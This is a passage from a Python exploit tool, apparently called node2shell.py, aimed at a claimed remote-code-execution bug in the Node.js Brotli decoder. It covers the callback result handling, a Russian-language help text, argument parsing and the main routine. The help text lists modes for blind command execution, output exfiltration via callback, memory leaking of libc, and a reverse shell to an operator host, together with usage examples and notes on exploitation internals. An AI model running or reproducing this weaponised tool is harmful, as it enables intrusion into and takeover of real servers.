    callback_name = "http://%s:%d/%s" % (advertised, server.port, token)
    report["callback_url"] = callback_name
    body_out = server.wait_callback(token, timeout)
    if body_out is None:
        reporter.bad("вывод команды не получен; выполнения нет")
        return 4, report
    report["success"] = True
    report["output"] = body_out.decode("utf-8", "replace")
    reporter.ok("обратный вызов %s, %d байт" % (callback_name, len(body_out)))
    reporter.verdict(True, paint.ok("RCE подтверждён: system() выполнил команду"))
    reporter.output(body_out)
    return 0, report


def help_text(paint):
    accent = paint.accent
    cyan = paint.cyan
    dim = paint.dim
    rows = [
        paint.title("NODE2SHELL  CVE-2026-111497")
        + "  " + dim("Brotli-декодер Node.js, METADATA -> system()"),
        "",
        cyan("БЫСТРЫЙ СТАРТ"),
        "  " + accent("node2shell.py") + " -u http://127.0.0.1:3000",
        "  " + accent("node2shell.py") + " -u http://127.0.0.1:3000 -c 'touch /tmp/pwn'",
        "  " + accent("node2shell.py") + " -u http://127.0.0.1:3000 -C -L 192.0.2.5",
        "  " + accent("node2shell.py") + " -u http://127.0.0.1:3000 --leak",
        "  " + accent("node2shell.py") + " -u http://127.0.0.1:3000 -r -L 192.0.2.5 -P 4444",
        "  " + accent("node2shell.py") + " -u https://127.0.0.1:8443/decode -k --leak",
        "",
        cyan("РЕЖИМЫ"),
        "  " + accent("blind") + "    по умолчанию: команда через system(), вывод не собирается",
        "  " + accent("callback") + " вывод команды приходит POST-запросом на встроенный сервер",
        "  " + accent("leak") + "     только лик libc и состояния, без записи тройки",
        "  " + accent("reverse") + "  обратная оболочка на -L и -P, слепая",
        "",
        cyan("ВЕКТОРЫ"),
        "  " + accent("auto") + "     определить вектор по HTTP, по умолчанию",
        "  " + accent("request") + "  POST с Content-Encoding: br, цель декодирует тело",
        "  " + accent("response") + " цель сама забирает наш URL через fetch(), поток",
        "           отдаёт встроенный сервер",
        "",
        cyan("ФЛАГИ"),
        "  " + accent("-u, --url") + " URL        адрес цели (или позиционный аргумент)",
        "  " + accent("-c, --cmd") + " КОМАНДА    команда для system() (по умолчанию id)",
        "  " + accent("-m, --mode") + " РЕЖИМ     auto | request | response",
        "  " + accent("-L, --lhost") + " АДРЕС    адрес оператора, доступный цели",
        "  " + accent("-P, --lport") + " ПОРТ     порт встроенного сервера или оболочки",
        "  " + accent("-C, --callback") + "       собирать вывод команды на встроенный сервер",
        "  " + accent("-r, --reverse") + "        обратная оболочка на -L/-P",
        "  " + accent("    --leak") + "           только лик libc и состояния",
        "  " + accent("-l, --lib") + " ФАЙЛ       libc цели для смещений execvp/system",
        "  " + accent("    --runtime") + "        резолвить базу libc и system в рантайме (по умолчанию)",
        "  " + accent("    --got") + " АДРЕС      fallback: адрес execvp@GOT (быстрый путь)",
        "  " + accent("    --resolve-workers") + " N  параллельных чтений резолвера (4)",
        "  " + accent("-k, --insecure") + "       не проверять TLS-сертификат цели (https)",
        "  " + accent("-s, --save") + " ПРЕФИКС  сохранить дампы лика и среза",
        "  " + accent("-t, --timeout") + " СЕК   общий таймаут (по умолчанию 90)",
        "  " + accent("    --plain") + "          без цвета (NO_COLOR действует так же)",
        "  " + accent("-j, --json") + "           машинный вывод, баннер в stderr",
        "  " + accent("-q, --quiet") + "          только вердикт и вывод команды",
        "  " + accent("-v, --version") + "        версия",
        "  " + accent("-h, --help") + "           эта справка",
        "",
        cyan("ОГРАНИЧЕНИЯ"),
        "  " + dim("* цель декодирует Brotli и отдаёт поток декодера клиенту: из него"),
        "  " + dim("  читается срез состояния, без него цепочка не работает ни в каком режиме;"),
        "  " + dim("* после подмены ringbuffer декодер нельзя уничтожать, канал держится;"),
        "  " + dim("* команда идёт через system() (sh -c) на x86_64, длина до 226 байт;"),
        "  " + dim("* https оборачивает тот же канал в TLS: проверка сертификата включена,"),
        "  " + dim("  для самоподписанного нужен -k; адрес fetch() на стороне цели может"),
        "  " + dim("  оставаться http; полный прогон проверен через edge-терминатор,"),
        "  " + dim("  TLS внутри приложения (куски <=16 КБ) ломает tail-copy;"),
        "  " + dim("* по умолчанию база libc и system резолвятся в рантайме: non-PIE —"),
        "  " + dim("  ELF по 0x400000, PT_DYNAMIC, DT_DEBUG, link_map, GNU hash; PIE —"),
        "  " + dim("  context_lookup из среза -> скан ELF-заголовка libbrotlicommon ->"),
        "  " + dim("  база libc (скан страниц) -> GNU hash(libc, system); без GOT-констант,"),
        "  " + dim("  смещений libc и DT_DEBUG-слота; non-PIE: 1255 чтений, 222-233 с/8 потоков,"),
        "  " + dim("  в response нужен явный zlib.createBrotliDecompress на цели:"),
        "  " + dim("  авто-декодер undici (BROTLI_OPERATION_FLUSH) роняет tail-copy;"),
        "  " + dim("* --got 0x7359140 оставлен быстрым fallback для проверенной сборки;"),
        "  " + dim("  для другой сборки нужен свой --got и -l;"),
        "  " + dim("* PIE-путь требует vulnerable brotli с incq-tail-copy: официальные node"),
        "  " + dim("  (bundled) подходят, системный brotli -O2 (qword store) не взводит"),
        "  " + dim("  примитив (см. evidence/pie.md);"),
        "  " + dim("* system выводится из лика, состояние из среза, входных адресов нет."),
        "",
        cyan("TELEGRAM") + "  " + paint.colour(ORANGE, TELEGRAM, underline=True),
    ]
    return "\n".join(rows)


class CommandLine(argparse.ArgumentParser):
    def error(self, message):
        raise UsageError(message)


def address_value(text):
    try:
        value = int(text, 0)
    except ValueError:
        raise argparse.ArgumentTypeError("ожидается адрес в hex или decimal: %s" % text)
    if not 0 < value <= MASK64:
        raise argparse.ArgumentTypeError("адрес вне диапазона: %s" % text)
    return value


def parse_arguments(argv):
    parser = CommandLine(add_help=False, prog="node2shell.py")
    parser.add_argument("address", nargs="?")
    parser.add_argument("program", nargs="?")
    parser.add_argument("-u", "--url")
    parser.add_argument("-c", "--cmd")
    parser.add_argument("-m", "--mode", default="auto", choices=["auto", "request", "response"])
    parser.add_argument("-L", "--lhost")
    parser.add_argument("-P", "--lport", type=int, default=0)
    parser.add_argument("-C", "--callback", action="store_true")
    parser.add_argument("-r", "--reverse", action="store_true")
    parser.add_argument("--leak", dest="leak_mode", action="store_true")
    parser.add_argument("-l", "--lib")
    parser.add_argument("--got", type=address_value,
                        help="fallback: адрес execvp@GOT (по умолчанию runtime)")
    parser.add_argument("--runtime", action="store_true",
                        help="резолвить базу libc и system в рантайме (по умолчанию)")
    parser.add_argument("--resolve-workers", type=int, default=4,
                        help="параллельных чтений резолвера (по умолчанию 4)")
    parser.add_argument("--system", type=address_value,
                        help="debug: готовый адрес system(), пропустить резолвер")
    parser.add_argument("-k", "--insecure", action="store_true")
    parser.add_argument("-s", "--save")
    parser.add_argument("-t", "--timeout", type=float, default=90.0)
    parser.add_argument("--plain", action="store_true")
    parser.add_argument("-j", "--json", dest="machine", action="store_true")
    parser.add_argument("-q", "--quiet", action="store_true")
    parser.add_argument("-v", "--version", action="store_true")
    parser.add_argument("-h", "--help", action="store_true")
    arguments = parser.parse_args(argv)
    arguments.url = arguments.url or arguments.address
    arguments.command = arguments.cmd or arguments.program
    return arguments


def main(argv):
    plain = "--plain" in argv or os.environ.get("NO_COLOR") is not None
    paint = Paint(not plain)
    machine = "-j" in argv or "--json" in argv
    quiet = "-q" in argv or "--quiet" in argv
    banner_stream = sys.stderr if (machine or quiet) else sys.stdout
    banner_stream.write(paint.banner() + "\n")
    banner_stream.write(paint.signature() + "\n\n")
    banner_stream.flush()
    try:
        arguments = parse_arguments(argv)
    except UsageError as error:
        sys.stderr.write(paint.bad("ошибка: ") + str(error) + "\n")
        sys.stderr.write("справка: node2shell.py -h\n")
        return 2
    if arguments.help:
        sys.stdout.write(help_text(paint) + "\n")
        return 0
    if arguments.version:
        sys.stdout.write("node2shell.py %s\n" % VERSION)
        return 0
    if not arguments.url:
        sys.stderr.write(paint.bad("ошибка: ") + "не задан адрес цели\n")
        sys.stderr.write(help_text(paint) + "\n")
        return 2
    try:
        stream = sys.stderr if arguments.machine else sys.stdout
        code, report = perform(arguments, paint, stream)
    except (OSError, ConnectionError, ValueError, http.client.HTTPException) as error:
        sys.stderr.write(paint.bad("сбой: ") + str(error) + "\n")
        return 5
    if arguments.machine:
        sys.stdout.write(json.dumps(report, ensure_ascii=False, indent=2) + "\n")
    elif arguments.quiet:
        if report.get("success"):
            status = "RCE подтверждён"
        elif report.get("verdict") == "patched":
            status = "патч: поток отклонён, выполнения нет"
        elif report.get("verdict") == "leak":
            status = "лик готов"
        elif report.get("verdict") == "reverse":
            status = "обратная оболочка отправлена"
        elif report.get("verdict") == "blind":
            status = "команда отправлена"
        else:
            status = "выполнение не подтверждено"
        sys.stdout.write(status + "\n")
    return code


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
